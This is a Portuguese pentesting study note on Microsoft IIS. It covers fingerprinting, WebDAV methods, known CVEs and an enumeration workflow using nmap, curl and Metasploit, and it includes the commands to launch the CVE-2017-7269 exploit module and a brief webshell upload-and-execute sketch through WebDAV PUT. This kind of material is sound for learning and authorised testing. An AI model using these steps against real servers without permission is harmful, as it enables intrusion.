# 🌐 IIS — Internet Information Services

> Servidor web da Microsoft integrado ao Windows Server.
> Alternativa ao Apache/nginx em ambientes corporativos Windows — e com sua própria superfície de ataque.

---

## 🧠 O Que é IIS

**Internet Information Services (IIS)** é o servidor web nativo do Windows, desenvolvido pela Microsoft. Vem pré-instalado no Windows Server e pode ser habilitado em versões desktop do Windows.

**Diferença fundamental do Apache/nginx:**
- Roda como serviço Windows (`W3SVC`)
- Gerenciado via GUI (IIS Manager) ou PowerShell
- Integração nativa com Active Directory e autenticação Windows
- Suporta ASP, ASP.NET, PHP (com módulo adicional)
- Cada site roda sob um **Application Pool** com identidade própria

---

## 🔢 Versões e Windows Correspondente

| Versão IIS | Windows Server | Windows Desktop |
|-----------|---------------|----------------|
| IIS 6.0 | 2003 | XP |
| IIS 7.0 | 2008 | Vista |
| IIS 7.5 | 2008 R2 | 7 |
| IIS 8.0 | 2012 | 8 |
| IIS 8.5 | 2012 R2 | 8.1 |
| IIS 10.0 | 2016 / 2019 / 2022 | 10 / 11 |

> 💡 Identificar a versão do IIS frequentemente revela a versão do Windows Server — útil para buscar CVEs específicos.

---

## 🔢 Portas Padrão

| Porta | Protocolo | Serviço |
|-------|-----------|---------|
| **80/TCP** | HTTP | Web padrão |
| **443/TCP** | HTTPS | Web com TLS |
| **8080/TCP** | HTTP alternativo | Comum em desenvolvimento |

---

## 🔍 Identificação e Fingerprinting

### Via Nmap
```bash
# Versão e headers
nmap -sV -p80,443 IP

# Scripts de detecção
nmap --script http-iis-webdav-vuln -p80 IP
nmap --script http-headers -p80 IP
nmap --script http-methods -p80 IP
```

### Via Curl — Headers Reveladores
```bash
curl -I http://IP
```

**Headers típicos do IIS:**
```
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
X-AspNet-Version: 4.0.30319
```

Esses headers revelam:
- Que é IIS (não Apache/nginx)
- Versão exata do IIS
- Que ASP.NET está ativo
- Versão do .NET Framework

### Via Metasploit
```bash
use auxiliary/scanner/http/http_version
set RHOSTS IP
run

use auxiliary/scanner/http/options
set RHOSTS IP
run
```

---

## 📁 Estrutura de Diretórios Padrão

```
C:\inetpub\
├── wwwroot\          ← root do site padrão (equivalente ao /var/www/html)
├── logs\             ← logs de acesso
└── temp\             ← arquivos temporários

C:\Windows\System32\inetsrv\  ← binários do IIS
```

---

## 🌐 WebDAV — A Extensão Mais Perigosa

**WebDAV (Web Distributed Authoring and Versioning)** é uma extensão do HTTP que adiciona métodos para **gerenciar arquivos remotamente** via HTTP. Quando habilitado no IIS, transforma o servidor web em um sistema de arquivos acessível remotamente.

### Métodos HTTP Adicionados pelo WebDAV

| Método | Função |
|--------|--------|
| `PROPFIND` | Listar propriedades de arquivos/diretórios |
| `PROPPATCH` | Modificar propriedades |
| `MKCOL` | Criar diretório |
| `COPY` | Copiar arquivo |
| `MOVE` | Mover arquivo |
| `LOCK` | Bloquear arquivo para edição |
| `UNLOCK` | Desbloquear arquivo |
| `PUT` | **Upload de arquivo** |
| `DELETE` | **Deletar arquivo** |

**Por que é perigoso:** `PUT` permite fazer upload de qualquer arquivo — incluindo scripts executáveis. Se o IIS executar o arquivo enviado, temos RCE.

### Verificar se WebDAV está Ativo
```bash
# Via curl — método OPTIONS mostra o que o servidor aceita
curl -v -X OPTIONS http://IP/

# Se WebDAV estiver ativo, você verá na resposta:
# Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH

# Via Nmap
nmap --script http-webdav-scan -p80 IP

# Via Metasploit
use auxiliary/scanner/http/webdav_scanner
set RHOSTS IP
run

# Verificar vulnerabilidades específicas de WebDAV
use auxiliary/scanner/http/webdav_internal_ip
use auxiliary/scanner/http/webdav_website_content
```

---

## ⚔️ Vulnerabilidades Importantes do IIS

### CVE-2017-7269 — Buffer Overflow no WebDAV (IIS 6.0)
**Afeta:** IIS 6.0 (Windows Server 2003)
**Vetor:** Buffer overflow na função `ScStoragePathFromUrl` do WebDAV
**Impacto:** RCE como `NT AUTHORITY\NETWORK SERVICE`

```bash
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS IP
run
```

---

### CVE-2021-31166 — HTTP Protocol Stack RCE (IIS 10.0)
**Afeta:** Windows Server 2019 / 2022 com IIS
**Vetor:** Wormable — pacote HTTP malformado causa BSOD ou RCE no kernel
**Impacto:** Crítico — sem autenticação

---

### WebDAV com PUT + Extensão Executável
**Não é CVE** — é misconfiguration. Se PUT está habilitado sem restrições de extensão:
```
PUT /shell.asp → upload de ASP webshell
GET /shell.asp?cmd=whoami → execução de código
```

---

### IIS Short Filename (8.3) Disclosure — CVE-2010-2730
Versões antigas do IIS expõem nomes de arquivo no formato 8.3 via respostas 404 com `~1`. Permite enumerar arquivos e diretórios mesmo sem directory listing.

```bash
use auxiliary/scanner/http/iis_shortname_scanner
set RHOSTS IP
run
```

---

## 🔧 Enumeração Completa — Workflow

```bash
# 1. Identificar servidor
nmap -sV -p80,443 IP
curl -I http://IP

# 2. Verificar métodos HTTP
curl -v -X OPTIONS http://IP/
nmap --script http-methods -p80 IP

# 3. WebDAV ativo?
use auxiliary/scanner/http/webdav_scanner

# 4. Enumerar diretórios
use auxiliary/scanner/http/dir_scanner
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt

# 5. Arquivos sensíveis
use auxiliary/scanner/http/files_dir

# 6. Verificar vulnerabilidades específicas
nmap --script http-iis-webdav-vuln -p80 IP
use exploit/windows/iis/iis_webdav_scstoragepathfromurl  # IIS 6.0
```

---

## 🔒 Headers de Segurança — O Que Verificar

Headers ausentes = misconfigurations reportáveis:

| Header | Proteção | Valor Recomendado |
|--------|---------|-----------------|
| `X-Frame-Options` | Clickjacking | `DENY` ou `SAMEORIGIN` |
| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
| `Content-Security-Policy` | XSS | Política restritiva |
| `Strict-Transport-Security` | HTTPS forçado | `max-age=31536000` |
| `Server` | Ocultar versão | Remover ou genérico |
| `X-Powered-By` | Ocultar stack | Remover |

```bash
# Verificar headers de segurança
nmap --script http-security-headers -p80 IP
```

---

## 🧠 IIS vs Apache — Diferenças Relevantes em Pentest

| | IIS | Apache |
|-|-----|--------|
| OS | Windows | Linux (geralmente) |
| Script padrão | ASP / ASP.NET | PHP |
| WebDAV | Módulo nativo | Módulo opcional |
| Auth Windows | ✅ Nativa | ❌ Não |
| Shell obtida | `cmd.exe` / PowerShell | `/bin/bash` |
| Usuário do processo | `IIS AppPool\DefaultAppPool` | `www-data` |

---

## 📌 Relacionados

- [[Cadaver — Cliente WebDAV]]
- [[DAVTest — Testando WebDAV]]
- [[ASP Webshell — Upload e Execução]]
- [[Top 10 Vulnerabilidades — Servicos Windows]]
- [[HTTP Apache Enumeration com Metasploit]]
- [[Nmap — NSE]]

#protocolo/http #windows #iis #webdav #recon/ativo
